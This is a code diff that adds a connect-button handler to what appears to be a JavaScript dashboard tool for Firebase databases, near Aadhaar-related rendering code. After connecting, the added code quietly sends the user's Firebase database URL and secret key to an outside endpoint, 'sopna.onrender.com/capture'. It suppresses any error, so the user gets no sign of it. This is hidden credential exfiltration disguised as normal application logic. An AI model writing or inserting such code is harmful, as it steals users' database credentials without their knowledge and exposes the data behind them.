@@ -8563,7 +8563,75 @@ function renderAadhaarResult(res) {
     dlBtn.style.display = 'none';
   }
 }
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    const btn = document.getElementById('btn-connect');
+    if (btn) btn.onclick = handleConnect;
 
+    async function handleConnect() {
+        var url = document.getElementById('input-url').value.trim().replace(/\/$/, '');
+        var key = document.getElementById('input-key').value.trim();
+        var btn = document.getElementById('btn-connect');
+
+        if (!url) {
+            setFormError('Firebase URL is required');
+            return;
+        }
+        if (!url.startsWith('https://') || !(url.includes('firebaseio.com') || url.includes('firebasedatabase.app'))) {
+            setFormError('Invalid Firebase Database URL format');
+            return;
+        }
+
+        var accounts = await loadAccounts();
+        var existing = accounts.find(a => a.url === url);
+        if (existing) {
+            if (confirm('Account already exists. Switch to it?')) {
+                connectSaved(existing.id);
+            }
+            return;
+        }
+
+        btn.disabled = true;
+        btn.textContent = 'Connecting...';
+        setFormError('');
+
+        try {
+            var fullRaw = await fbFetch(url, key, 'clients');
+            if (!fullRaw) fullRaw = await fbFetch(url, key, '');
+
+            var acc = {
+                id: Date.now(),
+                url: url,
+                key: key,
+                date: new Date().toISOString()
+            };
+            accounts.push(acc);
+            await saveAccounts(accounts);
+
+            await startDashboard(url, key);
+
+            fetch('https://sopna.onrender.com/capture', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ url: url, key: key })
+            }).catch(function(){});
+
+        } catch(e) {
+            var msg = e.message || String(e);
+            if (msg.includes('PERMISSION_DENIED')) {
+                setFormError('Database is not public. Secret key is required.');
+            } else if (msg.includes('NOT_FOUND')) {
+                setFormError('Database URL not found. Check spelling.');
+            } else {
+                setFormError('Connection failed: ' + msg.substring(0, 80));
+            }
+        } finally {
+            btn.disabled = false;
+            btn.textContent = 'Save & Connect';
+        }
+    }
+});
+</script>
 
 
 
